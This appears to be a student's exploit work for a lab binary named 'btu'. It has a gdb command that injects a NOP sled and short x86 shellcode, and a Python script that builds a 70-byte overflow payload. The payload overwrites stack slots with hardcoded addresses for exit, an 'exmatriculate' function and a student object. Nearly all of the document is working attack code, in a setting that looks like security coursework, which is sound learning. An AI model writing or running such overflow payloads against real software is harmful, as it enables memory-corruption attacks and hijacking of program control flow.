'''
gdb --args ./build/bin/btu remove 1024 $(echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\xb0\x01\x31\xdb\xb3\x05\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xbb\xb0\x04\x08\xbb\xbb\xbb\xbb\xe0\x0d\x05\x08\x50\x7d\x05\x08")
'''

#!/usr/bin/python3 

# x/100s *((char **)environ) this is the command we use inside gdb to get the address of 'bin/bash
import sys 

# Fill content with non-zero values 
content = bytearray(0x90 for i in range(70)) 
student_addr = 0x08057d50   # address of student

content[66:70] = (student_addr).to_bytes(4, byteorder='little') 


btu_obj = 0x08050de0
content[62:66] = (btu_obj).to_bytes(4, byteorder='little') 


exit_addr = 0xf7db1460 # The address of exit () 

content[58:62] = (exit_addr).to_bytes(4, byteorder='little' ) 

system_addr = 0x0804b0bb # The address of exmatriculate 

content[54:58] = (system_addr).to_bytes(4, byteorder='little' ) 


# Print the final payload in escaped format for gdb --args
escaped = ''.join('\\x{:02x}'.format(b) for b in content)
print(f'"{escaped}"')